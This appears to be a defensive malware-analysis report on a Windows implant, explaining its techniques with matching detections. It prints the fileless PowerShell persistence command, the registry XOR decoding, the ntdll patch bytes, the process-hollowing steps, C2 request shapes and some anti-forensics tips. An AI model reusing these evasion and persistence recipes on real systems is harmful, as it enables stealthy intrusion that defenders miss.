# RED-TEAM TECHNIQUE NOTES — SOLARA / REDACTED_C2_DOMAIN

*Companion to `MASTER_REPORT.md`. Written from the reverse-engineering of the samples
recovered on this host. Every technique below was **observed in the actual binary**,
not inferred. Each entry states the mechanism, the exact artefact that proves it, and
the defensive primitive that catches it.*

**Why this document exists:** understanding *how* an operator gets in and stays in is
what makes a detection defensible. A defender who only knows "check the registry for
weird values" will lose to the next builder. A defender who understands the tradecraft
can build durable detections and design a network that fails the tradecraft.

---

## PART 1 — THE OPERATING PRINCIPLE: EVASION IS ABOUT *SURFACE AREA*

The single most important design decision in this implant is that it tries to have
**no surface at all**:

| Traditional malware | This implant |
|---|---|
| File on disk → AV signature, file hash, disk forensics | **No file.** Payload lives in the registry and in RAM |
| Import table → static analysis says what it does | **Import table stripped to 3 functions.** Everything else resolved at runtime by hash |
| Named mutex → trivial "malware present" indicator | Mutex name is itself encrypted, and is *one of two* — a campaign lock and a per-bot lock |
| C2 domain → blocklist, DNS sinkhole, threat intel | Domain is cleartext in `.rdata` (cheap for the operator, expensive for us) but the *path* and *auth token* are encrypted |
| Network signature | Traffic is a plain `GET` to a fake PHP path behind Cloudflare + Let's Encrypt — indistinguishable from a browser |

**The tradecraft lesson:** the implant is not trying to be clever at the byte level. It
is trying to be *unremarkable*. It uses `conhost.exe` (signed), `powershell.exe` (signed),
`svchost.exe` (signed), a 25-entry list of signed System32 binaries, real WinINet, real
TLS, and a URL that looks like a web panel. The only genuinely novel parts are the
registry persistence and the reflective loader.

---

## PART 2 — PERSISTENCE: FILeless VIA `UserInitMprLogonScript`

**Technique.** `HKCU\Environment\UserInitMprLogonScript` is a Winlogon-consumed
per-user value. It is executed by the OS at interactive logon, before most user-mode
defenders have a chance to profile the session. It requires **no admin rights** and
**no file**.

```
HKCU\Environment\UserInitMprLogonScript
  = C:\Windows\System32\conhost.exe --headless
    C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
    -w hidden -nop -ep bypass
    -c "&([ScriptBlock]::Create([Text.Encoding]::UTF8.GetString(
         [Convert]::FromBase64String(
           (Get-ItemProperty 'HKCU:\Environment').UserCache))))"
```

**Why this is effective against defenders:**
- The value lives in `HKCU\Environment` — a key that is **not** in any default
  persistence-hunt list, and is dirtied by every installer on the machine.
- The payload itself is base64 in a *different* value (`UserCache`), so a rule that
  only looks for "long base64 in the persistence value" sees a short command.
- The command line contains `-w hidden -nop -ep bypass`, so even a hook that logs
  PowerShell command lines sees a legitimate-looking invocation of a signed binary.
- `conhost.exe --headless` is the specific trick: `conhost` is the console host, it
  accepts `--headless` for pseudo-console allocation, and it **hides the console
  window**. The result is a PowerShell process with *no visible window and no parent
  console*, spawned by a signed Microsoft binary. Many process-tree heuristics expect
  `conhost.exe` to be a *child* of the process it hosts; here it is the *parent*, which
  inverts the usual assumption and breaks "find the odd conhost" logic.

**Defensive primitive:**
- Hunt for `UserInitMprLogonScript` on **every** machine and treat any value that is
  not empty and not a legitimate script as malicious. There is no legitimate reason
  for this value to contain `powershell.exe`, `FromBase64String`, or `conhost`.
- Log `HKCU\Environment` writes (Sysmon Event ID 13) with a filter on the target key.
- Alert on `conhost.exe` **spawning** a child rather than being spawned by one.

---

## PART 3 — HOST-BOUND KEYING: `MachineGuid` AS THE XOR KEY

**Technique.** The three `CacheBlock_*` registry values hold hex-encoded, XOR-encrypted
shellcode. The XOR key is **the victim's own `MachineGuid`**:

```powershell
$k = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Cryptography).MachineGuid
# 33f5a4a6-910b-44c0-9b44-908c009d2dff
for($i=0;$i -lt $c.Count;$i++){ $c[$i] = $c[$i] -bxor $k[$i % $k.Length] }
```

**Offensive value:**
1. **The payload never exists in a transferable form.** A sandbox, a shared drive, a
   forum paste, or a C2 drop of "the loader" is useless without the target's GUID.
2. **One stolen registry value is not enough.** An attacker who grabs `UserCache` and
   `CacheBlock_*` still has to read the *target's* MachineGuid to build the payload.
3. **It defeats pattern-based detection of the encrypted blob.** The ciphertext differs
   on every victim, so there is no single "encrypted payload" signature.
4. It also defeats *detonation*: an analyst who copies the registry values to a
   sandbox sees nothing but noise, and a generic loader-decoder tool keyed on a
   hardcoded key fails.

**Defensive primitive:** the XOR key is a **well-known per-host value**. Any tool that
decodes the blob can read `MachineGuid` itself, so the keying is not a real secret —
but it *is* a very effective way to make the sample non-transferable and to defeat
hash-based clustering of the *encrypted* stage.

---

## PART 4 — THE FAKE COM CLSID AS A DATA VAULT

**Technique.** The encrypted shellcode is stored in:

```
HKCU\Software\Classes\CLSID\{A1B2C3D4-E5F6-7890-1234-567890ABCDEF}\Instance
    CacheBlock_0   CacheBlock_1   CacheBlock_2
```

**Why a COM CLSID:**
- The path *looks* legitimate. Registry hygiene tools and "remove unknown CLSIDs"
  scripts see a well-formed `HKCR\CLSID\{GUID}\Instance` shape.
- It is in the **per-user** `HKCU\Software\Classes` hive, so it needs no admin and
  does not touch machine-wide state.
- The GUID is a **synthetic placeholder** (`A1B2C3D4-E5F6-7890-1234-567890ABCDEF`) —
  deliberately the most "example-looking" shape possible, so a human skim-reads past it.
- The `Instance` subkey is a legitimate COM concept (used for `InprocServer32`
  surrogates), so the key is semantically plausible to a reviewer.
- It survives `HKCU\Software\Classes` inspection because a real COM CLSID *does*
  exist there.

**Defensive primitive:** alert on **any** `HKCU\Software\Classes\CLSID\{GUID}` that
has an `Instance` subkey but **no** `InprocServer32` and **no** registered `InprocServer32`
elsewhere for that CLSID. Real COM classes always have a server DLL. Also alert on
GUIDs whose hex digits are a strictly ascending/descending or obviously-synthetic
pattern (`A1B2C3D4-E5F6-7890-...`).

---

## PART 5 — ENV-VAR SHADOWING AS A STEALTH/BREAKAGE TECHNIQUE

**Technique.** The implant set a **user-scope** `windir = C:\Windows`:

```
HKCU\Environment\windir = C:\Windows
```

**Offensive value:** this shadows the *system* `windir` for every process that starts
in the user session and resolves `%windir%` from the merged environment block. Because
`HKCU\Environment` is merged *after* `HKLM\Environment` in the environment block, the
user value wins.

Consequences:
- Tools that compute `%windir%\System32` get a different (or invalid) path.
- Anything that resolves `%windir%` expecting a *system-owned* variable — cleanup
  scripts, forensic collectors, EDR self-protection, installers, sandbox agents — can
  be misdirected.
- It is a **denial-of-defence** primitive: it does not hide the implant, it breaks the
  tooling that would find the implant.

**Defensive primitive:** monitor for `windir`, `SystemRoot`, `ComSpec`, `Path`,
`TEMP`, `TMP`, `ProgramFiles`, `ProgramData` appearing under `HKCU\Environment`.
**These variables are SYSTEM-scoped by design. Any user-scope definition of them is
malicious or broken.** This is a very high-signal, very low-noise rule.

---

## PART 6 — THE 884-BYTE REFLECTIVE PE LOADER

**Technique.** The decrypted shellcode is not a PE loader in the "drop a file" sense —
it is a hand-written reflective loader that maps a PE **into its own address space**
with no `LoadLibrary` of the payload and no file.

Sequence (recovered from disassembly):
1. `gs:[0x60]` → PEB → `PEB->Ldr` → walk `InMemoryOrderModuleList`.
2. Export-name hashing to resolve `VirtualAlloc` / `VirtualProtect` from kernel32.
3. `VirtualAlloc(NULL, SizeOfImage, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)`.
4. Copy the PE headers, then each section, into the allocation.
5. **Resolve imports** — walk the import directory, `LoadLibraryA` each DLL,
   `GetProcAddress` each function (ordinal path handled via the high bit), write the
   resolved addresses into the IAT.
6. **Apply relocations** — delta = actual base − `ImageBase`, walk the base-relocation
   directory, apply `IMAGE_REL_BASED_DIR64` (type 0xA).
7. `VirtualProtect` the header page to `PAGE_EXECUTE_READWRITE`.
8. Restore registers and `jmp` to `AddressOfEntryPoint`.

**Offensive value:** the payload never appears in the process's module list, never
appears as a mapped file, and never appears in a file-system scan. It exists only as
a `MEM_PRIVATE` region containing an MZ header — invisible to any tool that enumerates
loaded modules.

**Defensive primitive:** enumerate **private executable regions** in every process and
look for a region whose first bytes are `MZ`. A legitimate DLL/EXE is always
`MEM_IMAGE`; a reflectively loaded one is always `MEM_PRIVATE`. This check finds
reflective loaders that every signature-based AV misses. Pair it with a check for a
private region ≥ 1 MB with `PAGE_EXECUTE*` protection.

---

## PART 7 — PEB-WALK EXPORT HASHING (IMPORT-TABLE DEFENSES)

**Technique.** The dropper's import table contains only three functions:
`InternetOpenA`, `CreateDXGIFactory`, and one C++ helper. All 28 real APIs are
resolved at runtime by walking the PEB and hashing export names:

```c
// seed is a per-call-site random 32-bit constant baked into the binary
h = SEED;
for each byte c of export_name:
    h = ((int)(signed char)c ^ h) * 0x143;   // 0x143 = 323
if (h == TARGET) { /* this is the function */ }
```

**Results:** 59 resolver sites, 59/59 resolved, 28 unique APIs, each resolver with a
**unique random seed**. The same API (`Sleep`, `InternetCloseHandle`, `memcpy`) is
resolved at *different call sites with different seeds*, so no single hash identifies
it.

**Offensive value:** a static analysis tool that reports "this binary imports
`WriteProcessMemory`" sees nothing. The binary's import table is indistinguishable
from a benign MSVC program's. Sandbox and EDR behavioural engines that key on the
import table see a program that only does `InternetOpenA` and DXGI.

**Defensive primitive:** hash-resolved imports are effectively invisible to static
analysis, so detection must be **behavioural** — but the *hash constants themselves*
are excellent static signatures. The 0x143 multiplier plus any three of the observed
target hashes (`0x92aefe46` Sleep, `0x18a946d8` InternetOpenUrlA, `0xfa1d7fdd`
CreateProcessW, `0xf60b9326` CreateMutexA, `0x8c42ed16` OpenMutexA, `0xb6312f41`
CryptStringToBinaryA, `0x1ebb8000` InternetReadFile) is a high-fidelity YARA rule and
is shipped in `malware.yar` as `SOLARA_Dropper_APIHashConstants`.

**Second lesson:** the RAT (stage 6) does **not** use this technique — it has a full
434-slot IAT across 55 DLLs. Obfuscation effort is not uniform across a chain, which
means **the weakest link in the chain is the best detection target.** Here, the
dropper is the weakest link and the RAT is the strongest.

---

## PART 8 — STRING OBFUSCATION: TWO LAYERS, TWO KEYS

**Layer A — 16-byte-chunked XOR over `.rdata`.**
A 32-byte key is materialised on the stack as four `movabs` immediates and applied in
16-byte chunks with `movdqu` / `xorps` / `movdqu`. The same encrypted blob is
duplicated ~22 times by the linker as COMDAT copies, which is why a naive scan of
`.rdata` shows a wall of repeated bytes.

```c
for (i = 0; i < len; i += 16)
    *(uint64_t*)(buf+i)   ^= key[i/8];
*(uint64_t*)(buf+i+8)   ^= key[i/8+1];
```

**Layer B — single-qword `imm1 ^ imm2`.**
Individual tokens (a scheme delimiter, a pipe name) are produced by XORing two
64-bit immediates at runtime. In this sample that yields `':'` (0x3a).

**Offensive value:** `strings` on the binary shows only MSVC runtime strings and
`REDACTED_C2_DOMAIN`. The URL path, the User-Agent, the mutex name, the API names of
`ntdll` internals, and the campaign tokens are all invisible.

**Defensive primitive:** decrypt the strings in the analyst's tooling and **use the
decrypted values as YARA/Sigma indicators** — this is how `REDACTED_MUTEX`,
`/Stb/PokerFace/init.php`, `NtQueryInformationProcess` and
`\\.\pipe\VccFramework` became signatures. The encrypted bytes are *also* good
signatures (they are constant for a given build), which is why
`SOLARA_Dropper_Stage2_Payload` keys on raw bytes at known RVAs.

---

## PART 9 — EDR HOOK BLINDING: THE `NtManageHotPatch` PATCH

**This is the most sophisticated technique in the sample.**

**Mechanism.** Before hollowing a target process, the implant patches a hook in the
*target's* `ntdll.dll`:

1. `VirtualProtectEx(target, NtManageHotPatch, 0x20, PAGE_READWRITE)`.
2. `ReadProcessMemory(target, NtManageHotPatch, buf, 0x20)`.
3. `memcmp` the first 0x20 bytes against the **canonical Microsoft prologue** of
   `NtManageHotPatch`:
   ```
   00 00 00 00 00 00 00 00   4C 8B D1 B8
   C0 C3 00 00               B8 B8 0C 00
   FF 00 00 00
   ```
4. If it matches, `WriteProcessMemory` the replacement **6 bytes**:
   ```
   B8 B8 0C 00 C0 C3      ;  mov eax, 0xC0000CB8
                           ;  ret
   ```
   `0xC0000CB8` is `STATUS_INVALID_CR_IMAGE_PARAMETER`-class — a plausible-looking
   "this call failed" return.
5. `FlushInstructionCache` to make the patch live.

**Why it matters.** EDR products hook `Nt*` syscalls **in the target process** by
patching the first bytes of the target's `ntdll` function. By overwriting the hooked
bytes with a *legitimate-looking* stub, the implant causes the hooked function to
return a benign status **without the EDR ever seeing the call**. The EDR's telemetry
shows "the process called `NtManageHotPatch`, it failed" — a routine-looking event.

**Why it targets `NtManageHotPatch` specifically:** it is a *rarely-called* function,
so most security products **do not hook it** — but it is also a function the implant
*needs* to work (see PART 10), so any product that *did* hook it would break the
hollowing. It is a surgical, low-collision choice.

**Defensive primitive:**
- **Monitor for writes to executable pages inside `ntdll.dll` of a remote process.**
  This is a high-fidelity signal: legitimate code almost never rewrites its own
  `ntdll` text section, and no legitimate product does it either.
- Watch for `VirtualProtectEx` + `ReadProcessMemory` + `WriteProcessMemory` +
  `FlushInstructionCache` **on the same target with `ntdll.dll` as the source address**
  — that is the exact signature of this chain.
- Also treat the byte pattern `B8 B8 0C 00 C0 C3` in a live process as a detection
  primitive.
- Defensive countermeasure: EDR products that verify `ntdll` integrity will detect the
  patch — but only if they check *before* the hollowing, which is a race the implant
  wins by being first.

---

## PART 10 — PROCESS HOLLOWING (RunPE), DONE PROPERLY

**The 13 steps** (full reconstructed C in `SOURCE_RECOVERY.md` Appendix C):

1. `GetModuleHandleA("ntdll")` → `LoadLibraryA("ntdll.dll")` →
   `GetProcAddress("NtQueryInformationProcess")` — the API name itself is encrypted.
2. Choose a host executable from a **25-entry list of `C:\Windows\System32\*.exe`**.
3. `CreateProcessW(host, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED(4), ...)`.
   `CREATE_SUSPENDED` means **the child never runs its own entry point** — the
   classic hollowing primitive.
4. PE-signature check on the target (`*(int*)(base+lfanew) == 0x4550`).
5. **Patch the target's `ntdll`** (PART 9) so EDR hooks in the target are neutralised.
6. `NtQueryInformationProcess(h, 0, &pbi, 0x30, &r)` → `pbi.PebBaseAddress`.
7. `VirtualAllocEx(h, NULL, SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE)`.
8. `WriteProcessMemory(h, base, PE, SizeOfHeaders, NULL)`.
9. Per-section `WriteProcessMemory(h, base+VirtualAddress, PE+PointerToRawData, SizeOfRawData)`.
10. **Retarget the PEB:** `WriteProcessMemory(h, pbi.PebBaseAddress, &newBase, 8)` —
    so the payload's own `PEB->ImageBaseAddress` points at the new mapping. Without
    this, the payload's RtlImageNtHeader and every API that reads the PEB for the
    module base resolves to the *host's* base and the payload breaks.
11. `CreateRemoteThread(h, NULL, 0, newBase + AddressOfEntryPoint, 0, 4, 0)`.
12. Re-map each section with **correct final protections** via
    `ZwQueryVirtualMemory` + `VirtualProtectEx` (so the payload is not left RWX
    everywhere — a sloppy hollow leaves an obvious RWX-page anomaly).
13. `SuspendThread` → `ResumeThread` → `FreeLibrary(ntdll)`.

**Offensive value, layer by layer:**
- The host process is a **signed Microsoft binary** ⇒ the process list looks clean.
- The payload never exists as a file ⇒ no file hash, no AV signature, no disk artefact.
- Because the section protections are fixed up afterwards, the finished process has
  **normal-looking page protections** — many hollowing detections look for "RWX
  sections", and this one is clean by the time they look.
- The PEB retarget is what makes the payload's internal self-inspection (PEB, `TEB`,
  module lists) consistent, so a hollowed process behaves like a normal process to
  anything that introspects it.

**Defensive primitive:**
- `CreateProcessW` with `CREATE_SUSPENDED` followed by `WriteProcessMemory` into the
  new process's address space is a **high-fidelity** behavioural pair.
- Cross-check: a System32 binary with **no arguments** whose parent is dead, whose
  thread count is elevated, and which has a large `MEM_PRIVATE` executable region.
- `WriteProcessMemory` to `PEB->ImageBaseAddress` (a `PEB+0x10` write) is an
  extremely rare operation and deserves a dedicated rule.

---

## PART 11 — TELEMETRY POISONING: THE 25-HOST LIST AND ITS DECOYS

**Technique.** The host list is 25 signed System32 binaries:
`dllhost.exe`, `svchost.exe`, `icacls.exe`, `ktmutil.exe`, `label.exe`, `lodctr.exe`,
`logman.exe`, `LsaIso.exe`, `makecab.exe`, `netbtugc.exe`, `odbcconf.exe`, `pcalua.exe`,
`print.exe`, `reg.exe`, `sc.exe`, `sdchange.exe`, `sihost.exe`, `sxstrace.exe`,
`SyncHost.exe`, `TCPSVCS.EXE`, `TieringEngineService.exe`, `unlodctr.exe`, `ucsvc.exe`,
`mountvol.exe`, `mmgaserver.exe`, `PATHPING.EXE` — **plus six binaries that do not
exist on stock Windows**:

```
Spectrum.exe   Specrum.exe   SppxCtObjmObj.Exe
TapiUnatend.exe   SgrmLpac.exe   ttstacer.exe
```

**Why the decoys are clever.** On a stock Windows install, those six names **do not
exist**, so `CreateProcessW` on them **fails**. A failed create produces a
`CreateProcess` event with a name that no rule matches and no corresponding successful
process — which is *exactly* the shape of a noisy/failed detection. If an analyst sees
"ttstacer.exe tried to start and failed" they have a false positive to burn time on,
while the *successful* hollow is buried under the legitimate host list.

**Offensive value:** the presence of six impossible names in the binary is a
**builder fingerprint** — it means this implant family is produced by a builder that
emits placeholder "host" entries. It is a strong clustering signal across a campaign.

**Defensive primitive:**
- Alert on any `CreateProcessW` whose image path is in System32 but **whose file does
  not exist** (or, more practically, on `CreateProcess` failures for System32 paths).
- Treat the six names as IOCs in a YARA/EDR rule even though they are decoys.
- Conversely, a hollowed host will be a System32 binary with a **bare or
  near-empty command line** — `svchost.exe` without `-k`, `dllhost.exe` without
  `/Processid:{...}`, `PATHPING.EXE` with no arguments. **All legitimate System32
  services are launched with a service-group argument or a service name.** A System32
  process with an empty command line is a strong hollow signal.

---

## PART 12 — TWO MUTEXES, NOT ONE (INSTANCE LOCK + CAMPAIGN LOCK)

**Technique.** The implant uses two named mutexes, both derived from the same
encrypted base string `REDACTED_MUTEX`:

```
REDACTED_MUTEXREDACTED_AUTHTOKEN    <- CreateMutexA(NULL, TRUE, name)
REDACTED_MUTEXREDACTED_CAMPAIGN <- OpenMutexA(0x1F0001, FALSE, name)
```

Logic:
```
CreateMutexA(m1)
if (GetLastError() != ERROR_ALREADY_EXISTS)   // no other instance
    if (OpenMutexA(m2) != NULL)  -> abort      // this CAMPAIGN is already running here
    else -> proceed to C2 loop
else
    -> return                                  // another instance of ME is running
```

**Offensive value:**
- The **first** mutex is a classic single-instance guard: exactly one copy of the
  implant runs, so the operator never double-loads a victim and never produces two
  beacons.
- The **second** mutex is a **campaign lock**: the operator can run different builds
  (different campaign tokens) side by side, but the *same* campaign cannot duplicate.
  This is campaign hygiene — it prevents two operators or two campaigns from
  colliding on one host and from each other's mutex.
- Because the names are **encrypted**, a defender cannot grep for them, and a
  "malware mutex" search returns nothing.

**Defensive primitive (and a beautiful defensive trick):** because the implant
*aborts* when the mutexes already exist, **an analyst can pre-create both mutex names
and the implant will exit silently without ever contacting the C2.** That is a
zero-network, zero-crash kill switch. It is a direct inversion of the offensive
technique — the defender uses the implant's own logic against it.

---

## PART 13 — THE ANALYST-NAME EXCLUSION LIST

**Technique.** The dropper reads the current username with `GetUserNameA` and compares
it (byte-for-byte, `memcmp`) against a hardcoded list of **eight names**:

```
george    Bruno    Abby    AMF    John    elz    Unknown    Admin
```

A match diverts execution **away from the normal C2 path**.

**Interpretation.** This is a *builder-kit* list of names belonging to people who work
with the kit — analysts, malware researchers, or the operator's own teammates. The
kit is built to **be inert on a researcher's machine**: no C2 contact, no payload
download, so the researcher sees "nothing happens" and rules the family out.

**Offensive value:** it converts the implant from a *detectable* artefact into an
*inert* one on exactly the machines most likely to analyse it. It is a
**self-disabling-on-analysis** feature, which is unusual and worth calling out.

**Defensive primitive:**
- The list is a **hard IOC**: those usernames appearing in a user corpus is worth
  reviewing (they may be kit operators, not victims).
- The list in the binary is a strong **campaign/builder fingerprint** — grep it
  across your sample corpus.
- Defensive thought: because `Admin` (this host's user) is on the list, the implant
  on this box was **already diverting execution away from the normal C2 path** — which
  means *some of the observed traffic came from the second-stage RAT, not the
  dropper*, and confirms the two-stage design.

---

## PART 14 — IN-MEMORY DOWNLOAD AND EXECUTION (NEVER TOUCHES DISK)

**Technique.** The C2 response is a base64 blob. It is decoded in memory with
`CryptStringToBinaryA` — **called twice**: the first call to obtain the size, the
second to fill the buffer. The decoded bytes are stashed in a global and handed
straight to the RunPE routine.

```
InternetOpenUrlA  ->  InternetReadFile (20,000-byte buffer, loop until 0 bytes)
   -> CryptStringToBinaryA (size)  ->  CryptStringToBinaryA (fill)
   -> global DAT_140012180  ->  RunPE
```

**Offensive value:** **the payload is never written to disk.** There is no file to
scan, no file to hash, no file to quarantine, nothing in the MFT, nothing in Prefetch,
nothing for a forensics team to recover. A disk-only incident response will conclude
"clean".

**Defensive primitive:**
- Intercept the **download**, not the file: alert on `InternetReadFile` into a buffer
  that is then passed to `VirtualAllocEx`/`WriteProcessMemory` without ever hitting
  `CreateFile`/`WriteFile`. **"Downloaded and ran without touching disk"** is a
  high-fidelity behavioural sequence.
- The dropper *does* contain `CreateFileA`/`WriteFile`, but they are used for the
  **named-pipe IPC**, not for the payload — so a naive "writes a file" rule would
  false-positive on the pipe.

---

## PART 15 — THE NAMED PIPE AS A LOCAL COVERT CHANNEL

**Technique.** The implant creates/opens **`\\.\pipe\VccFramework`** and writes its
config string to it. `VccFramework` is a plausible-sounding name borrowed from
Windows' own VCC (Visual C++ / MSVC component) vocabulary.

**Offensive value:**
- A named pipe is a **local, authenticated-free IPC channel** between the dropper and
  other components of the operator's toolkit on the same host.
- Pipes are **not** a conventional EDR telemetry source, so a whole component
  communication can be invisible.
- The name mimics a legitimate vendor component so a pipe-enumeration tool shows a
  "normal-looking" pipe among dozens of others.

**Defensive primitive:**
- Alert on **newly created named pipes** in `\\.\pipe\` that are not in a known-good
  baseline. Baseline the machine, then diff — a pipe is a persistent, named, on-disk
  namespace object and is one of the easiest artefacts to hunt.
- The pipe name is a high-fidelity IOC and is in the shipped YARA rules.

---

## PART 16 — THE C2 DISGUISE: A FAKE PHP WEB PANEL

**Technique.** The C2 is `REDACTED_C2_DOMAIN` — Cloudflare-fronted, with a **30-day Let's
Encrypt certificate** (2026-10-17 → 2027-01-15). Three endpoints, all shaped like a
legitimate PHP web panel:

```
GET /Stb/PokerFace/init.php?id=Elton
      User-Agent: Mozilla/5.0 (Windows NT 14_73_31; WOW64)
      Cookie: hash=2239784366428af5e59516a8fd0a0faf

GET /api/mnr/bobby31.php?type=sahipid&security=REDACTED_SECKEY&blds=REDACTED_BUILD_ID

GET /Stb/Unretev.php?bl=REDACTED_BUILD_ID.txt
      User-Agent: Mozilla/5.0
      Cache-Control: no-cache
```

**Why the disguise works:**
- The paths look like a PHP panel (`init.php`, `bobby31.php`, `Unretev.php`).
- The domain is behind **Cloudflare** with a valid LE cert ⇒ no certificate errors,
  no "self-signed cert" alert, and the origin is hidden.
- The traffic is a **plain GET with no body** ⇒ no POST-based IDS signature, no
  unusual payload, and it looks exactly like a browser fetching a page.
- The User-Agent is a real, dated, slightly-odd-but-plausible Windows UA
  (`Windows NT 14_73_31`) — a typo'd version string, the kind of thing real UAs
  contain.
- `Cache-Control: no-cache` on the heartbeat is what a real panel's AJAX poller sends.
- The `Cookie: hash=…` is a 32-hex-char value — it looks like a session hash, so a
  proxy log shows a normal cookie jar.

**Offensive value:** network defenders see Cloudflare + a PHP path + a browser UA. There
is essentially nothing to match on except the domain and the path.

**Defensive primitive:**
- The **domain and paths are the detection**. Deploy them as DNS/proxy blocklists and
  as YARA/Sigma.
- Watch for the **URL-shape**, not just the domain: `*.php?id=`, `*.php?type=…&security=…`,
  `*.php?bl=*.txt`, and a GET to a `.php` path with a `.txt` suffix on the query string
  is a strong heuristic for this family.
- `security=` and `sahipid=` and `blds=` as query parameter names are excellent
  network indicators.
- The `bl=` parameter carrying a **22-character base64url token** with a `.txt`
  suffix on the query string is a near-unique fingerprint.

---

## PART 17 — SANDBOX AND ANALYST EVASION

| Technique | Implementation | What it defeats |
|---|---|---|
| **Delayed execution** | `Start-Sleep -Seconds 35` as the first statement of the loader | Automated sandboxes that detonate for 5–30 s and snapshot the process. 35 s is just past the common 30 s window. |
| **Logon-triggered** | `UserInitMprLogonScript` | Sandboxes that replay a logon are rare; the implant only runs in a real interactive logon. |
| **GPU fingerprinting** | `CreateDXGIFactory` → `EnumAdapters` → `GetDesc` → `wcstombs` | Headless sandboxes and VMs frequently have **no GPU adapter**, or a recognisable one (`Microsoft Basic Render Driver`, `VMware SVGA 3D`, `VirtualBox Graphics Adapter`). The implant also sends the adapter name to the C2, so the **operator** can filter out sandboxes server-side. |
| **Username filter** | 8 hardcoded names (PART 13) | Analyst machines named after the kit's authors. |
| **Timestomping-adjacent** | Both PE timestamps are plausible and recent (dropper 2026-05-31, RAT 2026-09-24) | "Timestamp in the future" / "ancient" heuristics. |
| **Self-disabling** | 25-host list containing 6 non-existent binaries | Creates noise for automated process-creation rules. |
| **SEH-based flow** | Imports `RtlCaptureContext`, `RtlLookupFunctionEntry`, `RtlVirtualUnwind`, `UnhandledExceptionFilter`, `SetUnhandledExceptionFilter` | Debugger single-step detection and exception-based anti-trace; the same imports are also what the C runtime needs, so they blend in. |
| **IsDebuggerPresent** | Imported directly | Trivial but still present. |
| **MachineGuid keying** | PART 3 | Sample transfer; detonation in a sandbox (different GUID ⇒ garbage). |
| **User-scope `windir`** | PART 5 | Breakage of the defender's own tooling. |
| **Redundant re-injection** | 18 s and 14 s re-spawn after kills were observed | Resiliency against one-at-a-time termination. |

---

## PART 18 — THE OPERATOR'S OPERATIONAL SECURITY (AND WHERE IT FAILED)

**Good tradecraft observed:**
- **Per-victim keying** of the payload (MachineGuid) — no transferable sample.
- **Stripped import table + 59 per-site hash seeds** — no static signature on API use.
- **Encrypted strings in two schemes** — no `strings` output.
- **Fake CLSID vault** + **user-scope `windir`** — durable, plausible, no admin.
- **Legitimate-looking C2** — Cloudflare + LE + PHP panel paths.
- **In-memory-only payload** — no disk artefact at all.
- **Two-mutex campaign hygiene** — no duplicate beacons, no campaign collisions.
- **Five distinct sleeps** (5000 / 2000 / 10000 / 2500 / 6000 ms) staged through the
  C2 loop — defeats fixed-rate network detection.
- **A separate, larger RAT stage** with different tradecraft (full IAT, libcurl +
  OpenSSL + Crypto++ + SQLite + nlohmann/json) — the dropper is the fragile part.

**Where it failed — and this is the lesson:**
1. **The operator left build paths in the release binary.** `C:\Users\REDACTED_OPERATOR\Downloads\vcpkg-master\buildtrees\cryptopp\src\TOPP_8_2_0-66bcedf47f\` and `D:\CFILES\Projects\WinSSL\build\versions\3.4\3.4.0\` are in the `.rdata` of the shipped RAT. **Anyone who compiled a C++ project with Crypto++ or OpenSSL has this problem.** It gave us the operator's **username (`REDACTED_OPERATOR`)**, their **project layout**, their **exact library versions**, and their **package manager**. Strip build paths (`/Brepro`, `/PDBALTPATH:%_PDB%`, or a post-build scrub) before shipping.
2. **The operator ran a reconnaissance command on a victim and left the output file behind** — `cmd /c dir /a /s /b C:\*imgui_impl_win32.cpp C:\*.suo C:\*.exe C:\*.vcxproj C:\*.csproj > C:\ProgramData\CDat.bin2240`. It survived the parent process's death, kept the file locked, and was sitting on disk in `C:\ProgramData` when we looked. **Operational artefacts outlive operational mistakes.**
3. **The operator ran the builder's own tooling on a machine that was already compromised** — the `dir` sweep enumerated the developer's toolchain, red-team kits (`C:\Ghost Toolbox\` with wget/aria2c/7za), and project files. On a machine that is *already* under observation this is how you get caught.
4. **The implant wrote its own persistence back.** It holds the payload in memory and can write `HKCU\Environment` — so the operator (or the implant) re-armed the registry **byte-exactly** after we deleted it. **Cleanup that only removes artefacts loses to an implant that can re-create them.** Either kill the process *and* the persistence in the same window, or block the re-arm (e.g. deny write access to `HKCU\Environment\UserInitMprLogonScript` via a registry ACL, or enforce the value absent with a Group Policy / Defender ASR rule).
5. **It re-injected within 14–18 seconds.** A cleanup that kills a hollowed host and walks away loses the race. **Monitor for at least two minutes after the kill.**

---

## PART 19 — COUNTERMEASURE MAP (one line per technique)

| Offensive technique | Countermeasure |
|---|---|
| `UserInitMprLogonScript` persistence | Hunt every `HKCU\Environment` value; alert on `UserInitMprLogonScript` being non-empty and containing `powershell`/`FromBase64String`/`conhost` |
| Registry payload vault in fake CLSID | Alert on `HKCU\Software\Classes\CLSID\{*}\Instance` without a matching `InprocServer32` |
| User-scope `windir`/`SystemRoot`/`ComSpec` | Alert on any user-scope definition of system-scoped variables |
| MachineGuid-keyed payload | Not a defence — but a *clustering* aid: same `CacheBlock_*` sizes + same `UserCache` length ⇒ same build, different victims |
| 884-byte reflective loader | Enumerate `MEM_PRIVATE` executable regions containing `MZ`; alert on private RWX ≥ 1 MB in any non-JIT process |
| PEB-walk export hashing (×0x143) | YARA on the hash constants (`SOLARA_Dropper_APIHashConstants`) |
| Stripped IAT | Behavioural: treat "no imports" + "resolved APIs at runtime" as a scoring signal |
| 16-byte-chunked XOR / qword-pair strings | Decrypt in-house and ship the **plaintext** as indicators |
| `NtManageHotPatch` prologue patch | Alert on `WriteProcessMemory` whose source is inside a remote process's `ntdll.dll`; detect bytes `B8 B8 0C 00 C0 C3` |
| RunPE with `CREATE_SUSPENDED` | Correlate `CreateProcess(CREATE_SUSPENDED)` with a following `WriteProcessMemory` into that PID |
| PEB `ImageBaseAddress` retarget | Alert on `WriteProcessMemory` to a remote PEB+0x10 |
| 25-host list + 6 non-existent decoys | Alert on System32 `CreateProcess` failures; treat the 6 decoy names as IOCs |
| Two-mutex instance + campaign lock | **Pre-create both mutex names ⇒ the implant exits without phoning home** |
| 8-name analyst exclusion list | The names are IOCs; a match on a victim host means the implant is *inert* there |
| 35 s sleep | Sandbox with a ≥ 120 s window and interactive-logon replay |
| GPU fingerprinting | Alert on outbound C2 that carries a GPU-adapter string; watch for `CreateDXGIFactory` in unexpected processes |
| Named-pipe IPC `\\.\pipe\VccFramework` | Baseline + diff named pipes; alert on new ones |
